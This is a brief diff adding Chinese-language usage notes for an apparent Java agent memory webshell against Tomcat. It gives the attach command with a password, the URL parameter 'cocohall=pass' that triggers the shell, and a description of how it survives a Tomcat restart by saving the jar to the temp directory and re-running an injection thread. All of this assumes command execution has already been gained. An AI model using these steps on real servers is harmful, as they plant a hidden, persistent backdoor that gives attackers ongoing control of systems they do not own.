@@ -1,0 +1,9 @@
+
+获得命令执行权限后执行
+java -jar attach.jar agentshell.jar password
+
+然后访问anyurl?cocohall=pass
+
+重启tomcat后会
+保存jar到tomcat临时目录
+自动执行注入线程，等待注入
